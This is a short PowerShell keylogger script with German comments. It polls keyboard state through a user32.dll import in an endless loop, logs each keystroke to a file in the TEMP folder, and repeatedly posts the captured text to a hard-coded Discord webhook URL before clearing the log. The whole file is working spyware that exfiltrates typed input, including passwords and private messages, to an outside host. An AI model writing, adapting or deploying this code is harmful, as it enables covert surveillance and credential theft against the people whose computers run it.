$webhookUrl = "https://discord.com/api/webhooks/1491835548384624771/Ctl5jEJOKGH2VODXsix4B_LxlUPjwrawgF51OGTc9S19SlFDEyVhQHoHuC16VljzCrL5"

$LogPath = "$env:TEMP\log.txt"

Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class Keylogger {
    [DllImport("user32.dll")]
    public static extern short GetAsyncKeyState(int vKey);
}
"@

while ($true) {
    Start-Sleep -Milliseconds 10
    for ($i = 8; $i -le 190; $i++) {
        $state = [Keylogger]::GetAsyncKeyState($i)
        if ($state -eq -32767) {
            $key = [char]$i
            $key | Out-File -FilePath $LogPath -Append
            
            # Schickt Daten zu Discord, wenn die Log-Datei 20 Zeichen erreicht
            if ((Get-Item $LogPath).Length -gt 20) {
                $content = Get-Content $LogPath -Raw
                $payload = @{ content = "Getippt: $content" } | ConvertTo-Json
                Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType "application/json"
                Clear-Content $LogPath
            }
        }
    }
}
